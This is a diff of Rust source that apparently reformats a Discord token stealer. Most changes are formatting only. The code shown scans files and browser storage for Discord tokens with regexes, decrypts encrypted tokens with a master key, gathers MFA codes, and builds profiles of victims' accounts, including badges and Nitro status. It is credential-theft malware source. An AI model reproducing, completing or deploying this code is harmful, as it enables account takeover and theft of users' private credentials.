@@ -34,9 +34,9 @@ pub struct DiscordTokenTask {
 }
 
 static DISCORD_TOKEN_CACHE: Lazy<OnceCell<Arc<Vec<DiscordTokenRecord>>>> = Lazy::new(OnceCell::new);
-static DISCORD_BROWSER_TOKEN_CACHE: Lazy<OnceCell<Arc<Vec<DiscordTokenRecord>>>> = 
+static DISCORD_BROWSER_TOKEN_CACHE: Lazy<OnceCell<Arc<Vec<DiscordTokenRecord>>>> =
     Lazy::new(OnceCell::new);
-static DISCORD_PROFILE_CACHE: Lazy<OnceCell<Arc<Vec<DiscordProfileRecord>>>> = 
+static DISCORD_PROFILE_CACHE: Lazy<OnceCell<Arc<Vec<DiscordProfileRecord>>>> =
     Lazy::new(OnceCell::new);
 
 impl DiscordTokenTask {
@@ -194,7 +194,7 @@ struct DiscordTokenRecord {
 }
 
 async fn gather_discord_token_records(
-    roots: &[(String, PathBuf)]
+    roots: &[(String, PathBuf)],
 ) -> Result<Vec<DiscordTokenRecord>, RecoveryError> {
     let mut records = Vec::new();
 
@@ -204,7 +204,7 @@ async fn gather_discord_token_records(
             Ok((master_key, tokens)) if !tokens.is_empty() => {
                 for token in tokens {
                     let decrypted = if token.starts_with("dQw4w9WgXcQ:") {
-                         master_key
+                        master_key
                             .as_deref()
                             .and_then(|key| decrypt_discord_token(&token, key).ok())
                     } else {
@@ -234,7 +234,10 @@ async fn gather_discord_token_records(
     Ok(records)
 }
 
-fn scan_bytes_for_tokens(buffer: &[u8], look_for_encrypted: bool) -> Result<HashSet<String>, RecoveryError> {
+fn scan_bytes_for_tokens(
+    buffer: &[u8],
+    look_for_encrypted: bool,
+) -> Result<HashSet<String>, RecoveryError> {
     let mut tokens = HashSet::new();
 
     if look_for_encrypted {
@@ -264,12 +267,12 @@ fn scan_bytes_for_tokens(buffer: &[u8], look_for_encrypted: bool) -> Result<Hash
     let regex_mfa = Regex::new(r"mfa\.[\w-]{84}").unwrap();
 
     if let Ok(text) = std::str::from_utf8(buffer) {
-         for caps in regex_normal.captures_iter(text) {
-             tokens.insert(caps[0].to_string());
-         }
-         for caps in regex_mfa.captures_iter(text) {
-             tokens.insert(caps[0].to_string());
-         }
+        for caps in regex_normal.captures_iter(text) {
+            tokens.insert(caps[0].to_string());
+        }
+        for caps in regex_mfa.captures_iter(text) {
+            tokens.insert(caps[0].to_string());
+        }
     }
 
     Ok(tokens)
@@ -350,7 +353,7 @@ async fn collect_mfa_codes(proc_name: &str, root: &Path) -> Vec<String> {
 }
 
 async fn cached_discord_tokens(
-    roots: &[(String, PathBuf)]
+    roots: &[(String, PathBuf)],
 ) -> Result<Arc<Vec<DiscordTokenRecord>>, RecoveryError> {
     let roots = roots.to_vec();
     let cached = DISCORD_TOKEN_CACHE
@@ -412,7 +415,7 @@ const BROWSER_PATHS: &[(&str, &str)] = &[
 ];
 
 async fn gather_browser_discord_tokens(
-    local_app_data: &Path
+    local_app_data: &Path,
 ) -> Result<Vec<DiscordTokenRecord>, RecoveryError> {
     let mut records = Vec::new();
     let temp_dir = std::env::temp_dir().join("ixodes_discord_browser_tmp");
@@ -681,7 +684,12 @@ async fn collect_discord_profiles_inner(
     let mut profiles = Vec::new();
     let mut seen = HashSet::new();
     let mut tokens = cached_discord_tokens(roots).await?.as_ref().clone();
-    tokens.extend(cached_browser_discord_tokens(local_app_data).await?.as_ref().clone());
+    tokens.extend(
+        cached_browser_discord_tokens(local_app_data)
+            .await?
+            .as_ref()
+            .clone(),
+    );
 
     for record in tokens.iter().filter_map(|rec| {
         rec.decrypted
@@ -820,17 +828,39 @@ impl From<DiscordUser> for DiscordUserSummary {
     fn from(source: DiscordUser) -> Self {
         let mut badges = Vec::new();
         if let Some(flags) = source.public_flags {
-            if flags & 1 != 0 { badges.push("Staff".into()); }
-            if flags & 2 != 0 { badges.push("Partner".into()); }
-            if flags & 4 != 0 { badges.push("HypeSquad".into()); }
-            if flags & 8 != 0 { badges.push("BugHunter".into()); }
-            if flags & 64 != 0 { badges.push("HypeSquad Bravery".into()); }
-            if flags & 128 != 0 { badges.push("HypeSquad Brilliance".into()); }
-            if flags & 256 != 0 { badges.push("HypeSquad Balance".into()); }
-            if flags & 512 != 0 { badges.push("Early Supporter".into()); }
-            if flags & 16384 != 0 { badges.push("BugHunter Gold".into()); }
-            if flags & 131072 != 0 { badges.push("Verified Developer".into()); }
-            if flags & 4194304 != 0 { badges.push("Active Developer".into()); }
+            if flags & 1 != 0 {
+                badges.push("Staff".into());
+            }
+            if flags & 2 != 0 {
+                badges.push("Partner".into());
+            }
+            if flags & 4 != 0 {
+                badges.push("HypeSquad".into());
+            }
+            if flags & 8 != 0 {
+                badges.push("BugHunter".into());
+            }
+            if flags & 64 != 0 {
+                badges.push("HypeSquad Bravery".into());
+            }
+            if flags & 128 != 0 {
+                badges.push("HypeSquad Brilliance".into());
+            }
+            if flags & 256 != 0 {
+                badges.push("HypeSquad Balance".into());
+            }
+            if flags & 512 != 0 {
+                badges.push("Early Supporter".into());
+            }
+            if flags & 16384 != 0 {
+                badges.push("BugHunter Gold".into());
+            }
+            if flags & 131072 != 0 {
+                badges.push("Verified Developer".into());
+            }
+            if flags & 4194304 != 0 {
+                badges.push("Active Developer".into());
+            }
         }
 
         let nitro = match source.premium_type {
